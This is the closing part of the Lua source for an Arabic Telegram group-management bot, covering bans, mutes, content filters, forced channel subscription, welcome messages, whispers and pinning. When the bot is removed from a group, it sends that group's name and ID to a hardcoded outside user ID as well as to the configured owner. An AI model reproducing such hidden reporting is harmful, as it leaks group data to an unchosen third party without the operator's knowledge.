redis:del(bot_id..":"..msg.chat_id..":Status:Owner")
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator")
redis:del(bot_id..":"..msg.chat_id..":Status:Vips")
redis:del(bot_id.."List:Command:"..msg.chat_id)
for i = 1, #keys do 
redis:del(bot_id..keys[i])
end
return false
else
bot.sendText(msg.chat_id,msg.id,'*↯︙المجموعة معطلة من قبل *',"md", true)
end
end
----------------------------------------------------------------------------------------------------
end --- end Run
end --- end Run
----------------------------------------------------------------------------------------------------
function Call(data)
if redis:get(bot_id..":Notice") then
if data and data.luatele and data.luatele == "updateSupergroup" then
local Get_Chat = bot.getChat('-100'..data.supergroup.id)
if data.supergroup.status.luatele == "chatMemberStatusBanned" then
redis:srem(bot_id..":Groups",'-100'..data.supergroup.id)
bot.sendText(1342680269,0,'*\n• تم طرد البوت من المجموعه جديد \n• اسم المجموعة : '..Get_Chat.title..'\n• ايدي المجموعة :*`-100'..data.supergroup.id..'`\n• تم مسح جميع البيانات المتعلقه بالمجموعة',"md")
bot.sendText(sudoid,0,'*\n• تم طرد البوت من المجموعه جديد \n• اسم المجموعة : '..Get_Chat.title..'\n• ايدي المجموعة :*`-100'..data.supergroup.id..'`\n• تم مسح جميع البيانات المتعلقه بالمجموعة',"md")
end
end
end
----print(serpent.block(data, {comment=false}))

if data.luatele == "updateChatMember" then
if data.new_chat_member.member_id.user_id == tonumber(bot_id) then
if data.new_chat_member.status.can_delete_messages == true then
local chat_id = data.chat_id
local who_promot = data.actor_user_id
--code start
if redis:sismember(bot_id..'ban:online',chat_id) then ---check if ban
bot.sendText(chat_id,0,"\n*↯︙هذه المجموعة محظور سوف اغادر جاوو*","md",true)  
bot.leaveChat(chat_id)
end ---end check if ban
local Info_Chats = bot.getSupergroupFullInfo(chat_id) ---check if count is true
if tonumber(Info_Chats.member_count) < tonumber((redis:get(bot_id..'Num:Add:Bot') or 0)) and not devB(who_promot) then
bot.sendText(chat_id,0,'• عدد الاعضاء قليل لا يمكن تفعيل المجموعة\n يجب ان يكون اكثر من '..redis:get(bot_id..'Num:Add:Bot'),"md",true)
bot.leaveChat(chat_id)
end---end check if count is true
if not redis:sismember(bot_id..":Groups", chat_id) then ---done active
local Get_Chat = bot.getChat(chat_id)
local UserInfo = bot.getUser(who_promot)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}, 
},
{
{text = 'مغادرة المجموعة', data = '/leftgroup@'..chat_id}, 
},
}
}
bot.sendText(sudoid,0,'*\n• تم تفعيل المجموعه جديد \n• بواسطه : *['..UserInfo.first_name..'](tg://user?id='..who_promot..')*\n• معلومات المجموعة :\n• عدد الاعضاء ↤ '..Info_Chats.member_count..'\n• عدد الادمنيه ↤ '..Info_Chats.administrator_count..'\n• عدد المطرودين ↤ '..Info_Chats.banned_count..'\n• عدد المقيدين ↤ '..Info_Chats.restricted_count..'\n• الرابط\n : '..Info_Chats.invite_link.invite_link..'*',"md", true, false, false, false, reply_markup)
redis:sadd(bot_id..":Groups", chat_id)
redis:set(bot_id..'tagallgroup'..chat_id,'open') 
redis:set(bot_id.."Status:Link"..chat_id,true) 
redis:set(bot_id.."Status:Games"..chat_id,true) 
redis:set(bot_id.."Status:Reply"..chat_id,true) 
redis:set(bot_id.."calculate"..chat_id,true) 
redis:set(bot_id.."name:k"..chat_id,true) 
redis:set(bot_id.."brjj"..chat_id,true) 
redis:set(bot_id.."myzhrfa"..chat_id,true) 
redis:set(bot_id.."idnotmembio"..chat_id,true) 
redis:set(bot_id.."Abs:kol:Abs"..chat_id,true) 
redis:set(bot_id.."Abs:Addme:Abs"..chat_id,true) 
redis:set(bot_id.."Abs:Nzlne:Abs"..chat_id,true) 
redis:set(bot_id.."taggg"..chat_id,true) 
redis:set(bot_id.."Redis:setRt"..chat_id,true) 
redis:set(bot_id.."youutube"..chat_id,true) 
redis:set(bot_id.."thnaee"..chat_id,true) 
redis:set(bot_id.."shakse"..chat_id,true) 
redis:set(bot_id.."indar"..chat_id,true) 
redis:set(bot_id.."dartba"..chat_id,true) 
redis:set(bot_id.."shapeh"..chat_id,true) 
redis:set(bot_id.."anamen"..chat_id,true) 
redis:set(bot_id.."trfeh"..chat_id,true) 
redis:set(bot_id.."aftare"..chat_id,true) 
redis:set(bot_id.."ttzog"..chat_id,true) 
redis:set(bot_id.."zogne"..chat_id,true) 
redis:set(bot_id.."nsab"..chat_id,true) 
redis:set(bot_id.."AlThther:Chat"..chat_id,"true")
redis:set(bot_id.."replayallbot"..chat_id,true)
redis:set(bot_id.."Status:Welcome"..chat_id,true) 
redis:set(bot_id.."AlThther:Chat"..chat_id,"true")
redis:set(bot_id..'lockalllll'..chat_id,'on') 
redis:set(bot_id.."Status:IdPhoto"..chat_id,true) 
redis:del(bot_id.."spammkick"..chat_id)
redis:set(bot_id.."Lock:edit"..chat_id,true) 
redis:sadd(bot_id.."ChekBotAdd",chat_id)
redis:set(bot_id.."Status:Games"..chat_id,true) 
redis:set(bot_id.."Status:Id"..chat_id,true)
redis:set(bot_id.."Status:Reply"..chat_id,true)
redis:set(bot_id.."market"..chat_id,true) 
redis:set(bot_id.."Status:ReplySudo"..chat_id,true)
redis:set(bot_id.."Status:BanId"..chat_id,true)
redis:set(bot_id.."Status:SetId"..chat_id,true) 
local Info_Members = bot.getSupergroupMembers(chat_id, "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..chat_id..":Status:Creator",v.member_id.user_id) 
else
redis:sadd(bot_id..":"..chat_id..":Status:Administrator",v.member_id.user_id) 
end
end
end
local txt = '↯︙بواسطة ↫ 「 ['..UserInfo.first_name..'](tg://user?id='..who_promot..')⁪⁬‌‌‌‌ 」\n↯︙تم تفعيل المجموعة ['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..') تلقائياً\n'
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url = 't.me/QQOQQD'}, 
},
}
}
return bot.sendText(chat_id, 0 , txt, 'md', false, false, false, false, reply_markup)
end ---end done active
--code end
end
end
end

if data and data.luatele and data.luatele == "updateNewMessage" then
if data.message.sender.luatele == "messageSenderChat" then
if redis:get(bot_id..":"..data.message.chat_id..":settings:messageSenderChat") == "del" then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
return false
end
end
if data.message.sender.luatele ~= "messageSenderChat" then
if tonumber(data.message.sender.user_id) ~= tonumber(bot_id) then  
if data.message.content.text and data.message.content.text.text:match("^(.*)$") then
if redis:get(bot_id..":"..data.message.chat_id..":"..data.message.sender.user_id..":Command:del") == "true" then
redis:del(bot_id..":"..data.message.chat_id..":"..data.message.sender.user_id..":Command:del")
if redis:get(bot_id..":"..data.message.chat_id..":Command:"..data.message.content.text.text) then
redis:del(bot_id..":"..data.message.chat_id..":Command:"..data.message.content.text.text)
redis:srem(bot_id.."List:Command:"..data.message.chat_id,data.message.content.text.text)
t = "• تم مسح الامر "
else
t = " • عذراً الامر  ( "..data.message.content.text.text.." ) غير موجود "
end
bot.sendText(data.message.chat_id,data.message.id,"*"..t.."*","md",true)  
end
end
if data.message.content.text then
local NewCmd = redis:get(bot_id..":"..data.message.chat_id..":Command:"..data.message.content.text.text)
if NewCmd then
data.message.content.text.text = (NewCmd or data.message.content.text.text)
end
end
---------‐-------------
if data.message.content.text and data.message.content.text.text:match("^(.*)$") then
if redis:get(bot_id..":"..data.message.chat_id..":"..data.message.sender.user_id..":Commandd:dell") == "true" then
redis:del(bot_id..":"..data.message.chat_id..":"..data.message.sender.user_id..":Commandd:dell")
if redis:get(bot_id..":Commandd:"..data.message.content.text.text) then
redis:del(bot_id..":Commandd:"..data.message.content.text.text)
redis:srem(bot_id.."Listt:Commandd",data.message.content.text.text)
t = "• تم مسح الامر "
else
t = " • عذراً الامر  ( "..data.message.content.text.text.." ) غير موجود "
end
bot.sendText(data.message.chat_id,data.message.id,"*"..t.."*","md",true)  
end
end

if data.message.content.text then
local NewCmdd = redis:get(bot_id..":Commandd:"..data.message.content.text.text)
if NewCmdd then
data.message.content.text.text = (NewCmdd or data.message.content.text.text)
end
end

-------------------------------
if data.message.content.text then
td = data.message.content.text.text
if redis:get(bot_id..":TheCh") then
infokl = bot.getChatMember(redis:get(bot_id..":TheCh"),bot_id)
if infokl and infokl.status and infokl.status.luatele == "chatMemberStatusAdministrator" then
if not devS(data.message.sender.user_id) then
if td == "/start" or  td == "ايدي" or  td == "الرابط" or  td == "قفل الكل" or  td == "فتح الكل" or  td == "الاوامر" or  td == "م1" or  td == "م2" or  td == "م3" or  td == "كشف" or  td == "رتبتي" or  td == "المالك" or  td == "قفل الصور" or  td == "قفل الالعاب" or  td == "الالعاب" or  td == "العكس" or  td == "روليت" or  td == "كت" or  td == "تنزيل الكل" or  td == "رفع ادمن" or  td == "رفع مميز" or  td == "رفع منشئ" or  td == "المكتومين" or  td == "قفل المتحركه"  then
if bot.getChatMember(redis:get(bot_id..":TheCh"),data.message.sender.user_id).status.luatele == "chatMemberStatusLeft" then
Get_Chat = bot.getChat(redis:get(bot_id..":TheCh"))
Info_Chats = bot.getSupergroupFullInfo(redis:get(bot_id..":TheCh"))
if Info_Chats and Info_Chats.invite_link and Info_Chats.invite_link.invite_link and  Get_Chat and Get_Chat.title then 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = Get_Chat.title,url=Info_Chats.invite_link.invite_link}},
}
}
return bot.sendText(data.message.chat_id,data.message.id,Reply_Status(data.message.sender.user_id,"*• عليك الاشتراك في قناة البوت اولاً *").yu,"md", true, false, false, false, reply_dev)
end
end
end
end
end
end
end
if redis:sismember(bot_id..":bot:Ban", data.message.sender.user_id) then    
if GetInfoBot(data.message).BanUser then
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif GetInfoBot(data.message).BanUser == false then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end
end  
if redis:sismember(bot_id..":bot:silent", data.message.sender.user_id) then    
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end  
if redis:sismember(bot_id..":"..data.message.chat_id..":silent", data.message.sender.user_id) then    
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})  
end
if redis:sismember(bot_id..":"..data.message.chat_id..":Ban", data.message.sender.user_id) then    
if GetInfoBot(data.message).BanUser then
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif GetInfoBot(data.message).BanUser == false then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end
end 
if redis:sismember(bot_id..":"..data.message.chat_id..":restrict", data.message.sender.user_id) then    
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
end  
if not Administrator(msg) then
if data.message.content.text then
hash = redis:sismember(bot_id.."mn:content:Text"..data.message.chat_id, data.message.content.text.text)
tu = "الرساله"
ut = "ممنوعه"
elseif data.message.content.sticker then
hash = redis:sismember(bot_id.."mn:content:Sticker"..data.message.chat_id, data.message.content.sticker.sticker.remote.unique_id)
tu = "الملصق"
ut = "ممنوع"
elseif data.message.content.animation then
hash = redis:sismember(bot_id.."mn:content:Animation"..data.message.chat_id, data.message.content.animation.animation.remote.unique_id)
tu = "المتحركه"
ut = "ممنوعه"
elseif data.message.content.photo then
hash = redis:sismember(bot_id.."mn:content:Photo"..data.message.chat_id, data.message.content.photo.sizes[1].photo.remote.unique_id)
tu = "الصوره"
ut = "ممنوعه"
end
if hash then    
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
bot.sendText(data.message.chat_id,data.message.id,Reply_Status(data.message.sender.user_id,"*• "..tu.." "..ut.." من المجموعة*").yu,"md",true)  
end
end
if data.message and data.message.content then
if data.message.content.luatele == "messageSticker" or data.message.content.luatele == "messageUnsupported" or data.message.content.luatele == "messageContact" or data.message.content.luatele == "messageVideoNote" or data.message.content.luatele == "messageDocument" or data.message.content.luatele == "messageVideo" or data.message.content.luatele == "messageAnimation" or data.message.content.luatele == "messagePhoto" then
redis:sadd(bot_id..":"..data.message.chat_id..":mediaAude:ids",data.message.id)  
end
end
Run(data.message,data)
Run_Callback()
Return_Callback(data.message)
if data.message.content.text then
if data.message.content.text and not redis:sismember(bot_id..'Spam:Group'..data.message.sender.user_id,data.message.content.text.text) then
redis:del(bot_id..'Spam:Group'..data.message.sender.user_id) 
end
end
if data.message.content.luatele == "messageChatJoinByLink" then
if redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink")== "del" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink")== "ked" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink") == "ktm" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:JoinByLink")== "kick" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
end
end
if data.message.content.luatele == "messageChatDeleteMember" or data.message.content.luatele == "messageChatAddMembers" or data.message.content.luatele == "messagePinMessage" or data.message.content.luatele == "messageChatChangeTitle" or data.message.content.luatele == "messageChatJoinByLink" then
if redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr")== "del" then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr")== "ked" then
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr") == "ktm" then
redis:sadd(bot_id..":"..data.message.chat_id..":settings:mute",data.message.sender.user_id) 
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
elseif redis:get(bot_id..":"..data.message.chat_id..":settings:Tagservr")== "kick" then
bot.deleteMessages(data.message.chat_id,{[1]= data.message.id})
bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'banned',0)
end
end 
end

if data.message.content.luatele == "messageChatJoinByLink" and redis:get(bot_id..'Status:joinet'..data.message.chat_id) == 'true' then
    local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = '𖦹 انا لست بوت 𖦹', data = data.message.sender.user_id..'/UnKed'},
    },
    }
    } 
    bot.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
    return bot.sendText(data.message.chat_id, data.message.id, '• عليك اختيار انا لست بوت لتخطي نظام التحقق', 'md',false, false, false, false, reply_markup)
    end
    
if data.message.content.luatele == "messageChatJoinByLink" then
if not redis:get(bot_id..":"..data.message.chat_id..":settings:Welcome") then
local UserInfo = bot.getUser(data.message.sender.user_id)
local tex = redis:get(bot_id..":"..data.message.chat_id..":Welcome")
if UserInfo.username and UserInfo.username ~= "" then
User = "[@"..UserInfo.username.."]"
Usertag = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
else
User = "لا يوجد"
Usertag = '['..UserInfo.first_name..'](tg://user?id='..data.message.sender.user_id..')'
end
if tex then 
tex = tex:gsub('name',UserInfo.first_name) 
tex = tex:gsub('user',User) 
bot.sendText(data.message.chat_id,data.message.id,tex,"md")  
else
bot.sendText(data.message.chat_id,data.message.id,"يآهلا وسهلآ بصديقنا الغآلي ❥\nالله يحييك نوّرت المجموعهنا 🖤\nٴ▫️ "..Usertag.."\nالرجاء الالتزام بالقوانين 🖤\nـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ\n🔺 للأستفسار تواصل مع المالك\n","md",true)
end
end
end

if data.message.content.luatele == "messageChatAddMembers" and redis:get(bot_id..":infobot") then 
if data.message.content.member_user_ids[1] == tonumber(bot_id) then 
local photo = bot.getUserProfilePhotos(bot_id)
kup = bot.replyMarkup{
type = 'inline',data = {
{{text ="• اضفني لمجموعتك •",url="https://t.me/"..bot.getMe().username.."?startgroup=new"}},
}
}
if photo.total_count > 0 then
bot.sendPhoto(data.message.chat_id, data.message.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*• انا بوت اسمي راومو\n• اختصاصي حماية المجموعةات وادارتها\n• يوتيوب، تشغيل الاغاني في المكالمه ، العاب، كت تويت، والعديد من الميزات اكتشفها بنفسك\n• والأفضل من هذا ان البوت مبرمج على النسخة الجديدة 64 بت خالٍ من المشاكل .\n• تريد تفعلني ارفعني مشرف بس *", 'md', nil, nil, nil, nil, nil, nil, nil, nil, nil, kup)
else
bot.sendText(data.message.chat_id,data.message.id,"*• انا بوت اسمي راومو\n• اختصاصي حماية المجموعةات وادارتها\n• يوتيوب، تشغيل الاغاني في المكالمه ، العاب، كت تويت، والعديد من الميزات اكتشفها بنفسك\n• والأفضل من هذا ان البوت مبرمج على النسخة الجديدة 64 بت خالٍ من المشاكل .\n• تريد تفعلني ارفعني مشرف بس *","md",true, false, false, false, kup)
end
end
end
end
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
local msg = bot.getMessage(data.chat_id, data.message_id)
if tonumber(msg.sender.user_id) ~= tonumber(bot_id) then  
if redis:sismember(bot_id..":bot:silent", msg.sender.user_id) then    
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end  
if redis:sismember(bot_id..":"..msg.chat_id..":silent", msg.sender.user_id) then    
bot.deleteMessages(msg.chat_id,{[1]= msg.id})  
end
if redis:sismember(bot_id..":"..msg.chat_id..":Ban", msg.sender.user_id) then    
if GetInfoBot(msg).BanUser then
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif GetInfoBot(msg).BanUser == false then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end  
if redis:sismember(bot_id..":"..msg.chat_id..":restrict", msg.sender.user_id) then    
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
end  
if not Administrator(msg) then
if msg.content.text then
hash = redis:sismember(bot_id.."mn:content:Text"..msg.chat_id, msg.content.text.text)
tu = "الرساله"
ut = "ممنوعه"
elseif msg.content.sticker then
hash = redis:sismember(bot_id.."mn:content:Sticker"..msg.chat_id, msg.content.sticker.sticker.remote.unique_id)
tu = "الملصق"
ut = "ممنوع"
elseif msg.content.animation then
hash = redis:sismember(bot_id.."mn:content:Animation"..msg.chat_id, msg.content.animation.animation.remote.unique_id)
tu = "المتحركه"
ut = "ممنوعه"
elseif msg.content.photo then
hash = redis:sismember(bot_id.."mn:content:Photo"..msg.chat_id, msg.content.photo.sizes[1].photo.remote.unique_id)
tu = "الصوره"
ut = "ممنوعه"
end
if hash then    
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*• "..tu.." "..ut.." من المجموعة*").yu,"md",true)  
end
end
redis:incr(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") 
----------------------------------------------------------------------------------------------------
if not BasicConstructor(msg) then
if msg.content.luatele == "messageContact" or msg.content.luatele == "messageVideoNote" or msg.content.luatele == "messageDocument" or msg.content.luatele == "messageAudio" or msg.content.luatele == "messageVideo" or msg.content.luatele == "messageVoiceNote" or msg.content.luatele == "messageAnimation" or msg.content.luatele == "messagePhoto" then
if redis:get(bot_id..":"..msg.chat_id..":settings:Edited") then
if redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "del" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "ked" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "ktm" then
redis:sadd(bot_id..":"..msg.chat_id..":settings:mute",msg.sender.user_id) 
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif redis:get(bot_id..":"..msg.chat_id..":settings:Edited") == "kick" then
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
bot.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
ued = bot.getUser(msg.sender.user_id)
ues = " العضو ["..ued.first_name.."](tg://user?id="..msg.sender.user_id..") "
infome = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
lsme = infome.members
t = "*• قام ( *"..ues.."* ) بتعديل رسالته \n ━━━━━━━━━━━ \n*"
for k, v in pairs(lsme) do
if infome.members[k].bot_info == nil then
local UserInfo = bot.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
t = t..""..k.."- [@"..UserInfo.username.."]\n"
else
t = t..""..k.."- ["..UserInfo.first_name.."](tg://user?id="..v.member_id.user_id..")\n"
end
end
end
if #lsme == 0 then
t = "*• لا يوجد مشرفين في المجموعة*"
end
bot.sendText(msg.chat_id,msg.id,t,"md", true)
end
end
end
end
elseif data and data.luatele and data.luatele == "updateNewInlineCallbackQuery" then
local Text = bot.base64_decode(data.payload.data)
if Text and Text:match('/Hmsa1@(%d+)@(%d+)/(%d+)') then
local ramsesadd = {string.match(Text,"^/Hmsa1@(%d+)@(%d+)/(%d+)$")}
if tonumber(data.sender_user_id) == tonumber(ramsesadd[1]) or tonumber(ramsesadd[2]) == tonumber(data.sender_user_id) then
local inget = redis:get(bot_id..'hmsabots'..ramsesadd[3]..data.sender_user_id)
https.request("https://api.telegram.org/bot"..Token..'/answerCallbackQuery?callback_query_id='..data.id..'&text='..URL.escape(inget)..'&show_alert=true')
else
https.request("https://api.telegram.org/bot"..Token..'/answerCallbackQuery?callback_query_id='..data.id..'&text='..URL.escape('𖦹 هذه الهمسه ليست لك 𖦹')..'&show_alert=true')
end
end
elseif data and data.luatele and data.luatele == "updateNewInlineQuery" then
local Text = data.query
if Text and Text:match("^(.*) @(.*)$")  then
local username = {string.match(Text,"^(.*) @(.*)$")}
local UserId_Info = bot.searchPublicChat(username[2])
if UserId_Info.id then
local idnum = math.random(1,64)
local input_message_content = {message_text = 'هذه الهمسه للحلو ( [@'..username[2]..'] ) هو اللي يقدر يشوفها 📧', parse_mode = 'Markdown'}	
local reply_markup = {inline_keyboard={{{text = 'فتح الهمسه 📬', callback_data = '/Hmsa1@'..data.sender_user_id..'@'..UserId_Info.id..'/'..idnum}}}}	
local resuult = {{type = 'article', id = idnum, title = 'هذه همسه سريه الى [@'..username[2]..']', input_message_content = input_message_content, reply_markup = reply_markup}}	
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&results='..JSON.encode(resuult))
redis:set(bot_id..'hmsabots'..idnum..UserId_Info.id,username[1])
redis:set(bot_id..'hmsabots'..idnum..data.sender_user_id,username[1])
end
end

elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
Callback(data)
elseif data and data.luatele and data.luatele == "updateMessageSendSucceeded" then

local msg = data.message
local Chat = msg.chat_id
if msg.content.text then
text = msg.content.text.text
end
if msg.content.video_note then
if msg.content.video_note.video.remote.id == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
if idPhoto == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.sticker then 
if msg.content.sticker.sticker.remote.id == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.voice_note then 
if msg.content.voice_note.voice.remote.id == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.video then 
if msg.content.video.video.remote.id == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.animation then 
if msg.content.animation.animation.remote.id ==  redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.document then
if msg.content.document.document.remote.id == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif msg.content.audio then
if msg.content.audio.audio.remote.id == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
elseif text then
if text == redis:get(bot_id.."PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id.."PinMsegees:"..msg.chat_id)
end
end
if data.message and data.message.content then
if data.message.content.luatele == "messageSticker" or data.message.content.luatele == "messageUnsupported" or data.message.content.luatele == "messageContact" or data.message.content.luatele == "messageVideoNote" or data.message.content.luatele == "messageDocument" or data.message.content.luatele == "messageVideo" or data.message.content.luatele == "messageAnimation" or data.message.content.luatele == "messagePhoto" then
redis:sadd(bot_id..":"..data.message.chat_id..":mediaAude:ids",data.message.id)  
end
if msg.content.text then
if text == redis:get(bot_id..":PinMsegees:"..msg.chat_id) then
bot.pinChatMessage(msg.chat_id,msg.id,true)
redis:del(bot_id..":PinMsegees:"..msg.chat_id)
end
end
end
end
----------------------------------------------------------------------------------------------------
end
Runbot.run(Call)